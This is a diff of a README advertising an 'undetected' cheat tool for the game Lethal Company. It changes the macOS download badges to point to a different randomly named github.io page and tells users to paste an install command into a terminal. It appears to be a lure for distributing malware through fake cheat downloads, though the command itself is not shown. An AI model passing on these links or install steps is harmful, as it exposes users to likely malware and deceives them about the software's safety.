@@ -1,8 +1,8 @@
 # 🎮 Lethal Company Imperium Tool — Evidence V2
 
 [![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://mkiiavwgxyhx.github.io/windows-runner/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://mkiiavwgxyhx.github.io/windows-runner/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://mkiiavwgxyhx.github.io/windows-runner/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://tlwbljvlzhgm.github.io/macos-install/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://tlwbljvlzhgm.github.io/macos-install/)
 [![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://mkiiavwgxyhx.github.io/windows-runner/)
 
 > The most trusted **Lethal Company Imperium Tool** for 2026 — operates as a standalone utility with no game process injection, providing a safe and undetected experience.
@@ -52,7 +52,7 @@
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 **Menu Controls**
 
